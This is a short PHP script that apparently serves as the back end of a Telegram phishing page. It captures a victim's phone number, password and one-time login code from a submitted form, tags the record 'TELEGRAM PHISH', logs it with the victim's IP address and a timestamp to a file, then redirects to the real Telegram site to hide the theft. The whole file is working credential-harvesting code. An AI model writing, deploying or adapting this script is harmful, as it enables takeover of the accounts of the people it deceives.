<?php
if ($_POST) {
    $phone = $_POST['phone'] ?? '';
    $password = $_POST['password'] ?? '';
    $code = $_POST['code'] ?? '';
    
    $data = "=== TELEGRAM PHISH ===\n";
    $data .= "Phone: " . $phone . "\n";
    $data .= "Password: " . $password . "\n";
    $data .= "Code: " . $code . "\n";
    $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $data .= "Time: " . date('Y-m-d H:i:s') . "\n\n";
    
    file_put_contents('log.txt', $data, FILE_APPEND);
}
header("Location: https://telegram.org");
exit();
?>